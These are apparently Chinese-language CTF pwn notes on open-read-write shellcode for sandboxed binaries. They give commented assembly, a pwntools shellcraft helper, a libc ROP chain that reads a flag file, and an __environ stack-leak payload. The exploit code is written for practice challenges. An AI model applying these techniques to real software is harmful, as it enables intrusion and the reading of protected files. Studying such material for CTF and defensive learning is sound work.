以这个为例：[gwctf_2019_shellcode](https://buuoj.cn/challenges#gwctf_2019_shellcode)



**看沙箱保护**

```
seccomp-tools dump ./pwn
```

![image-20240628151234891](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\other\orw\images\image-20240628151234891.png)



**编写orw shellcode**

```c
open(flag_addr,0) // "flag"地址，模式(READ_ONLY)
read(3,addr,0x50) // fd:3，即前面打开的flag文件的fd (进程默认文件描述符0,1,2)，读取到addr的地方，大小为0x50
write(1,addr,0x50) // 将addr的0x50字节数据写到fd=1即标准输出里
```

对应汇编代码编写

`open(flag_addr,0):`

```assembly
push 0x67616c66 # 倒序压入字符串 "flag" -> "galf"
push rsp
pop rdi

#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串'flag'
#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi
#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址

push 0
pop rsi
push 2 # 64位open的系统调用号
pop rax

syscall
```



`read(3,addr,0x50)`：

```assembly
push 3
pop rdi
push rsp
pop rsi
#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个地址是什么，只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址是什么，真的不重要，重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。

push 0x50
pop rdx
push 0
pop rax

syscall
```



`write(1,addr,0x50)`：

```assembly
push 1
pop rdi
push rsp
pop rsi
#这个地方的push rsp pop rsi原理同上

push 0x50
pop rdx
push 1
pop rax

syscall
```



写好后

```python
shellcode = asm("""
...
""")

p.send(shellcode)
```

![image-20240628152046740](D:\N0zoM1z0\CyberSpaceSecurity\Pwn\other\orw\images\image-20240628152046740.png)



# shellcode orw

```python
def orw_code(address):
	code = shellcraft.open('./flag') + shellcraft.read(3,address,0x100) + shellcraft.write(1,address,0x100)
	return asm(code)
```





# ROP orw

几个点要注意下：

1. `open(flag,0)`

   flag：'flag'字符串的**地址**！

   记得传第二个参数0！！

2. rdx的gadget在程序中一般没有，都是泄露libc后去libc中找。



```python
open_f = libcbase + libc.sym['open']
read_f = libcbase + libc.sym['read']
write_f = libcbase + libc.sym['write']
rdx_r12 = 0x000000000011f497 + libcbase

# open('./flag')
# read(3,bss+0x500,0x100)
# write(1,bss+0x500,0x100)
flag = 0x0000000000601046
pl += p64(rdi) + p64(flag) + p64(rsi_r15) + p64(0)*2 + p64(open_f)
pl += p64(rdi) + p64(3) + p64(rsi_r15) + p64(bss+0x100)*2 + p64(rdx_r12) + p64(0x100)*2 + p64(read_f)
pl += p64(rdi) + p64(1) + p64(rsi_r15) + p64(bss+0x100)*2 + p64(rdx_r12) + p64(0x100)*2 + p64(write_f)
```



如果源程序没有'flag'字符串，就需要我们泄露栈地址然后将flag写在栈上。

泄露方法

# __environ泄露栈地址

```python
# leak stack_addr
environ = libc_base + libc.sym['__environ']
payload = b'a'*0x28 + p64(rdi) + p64(environ) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
sla(b'read\n', b'-1')
sa(b'read:\n', payload)
stack = get_addr()
```

然后gdb动调看leak的栈地址和我们想要的字符串的offset即可。
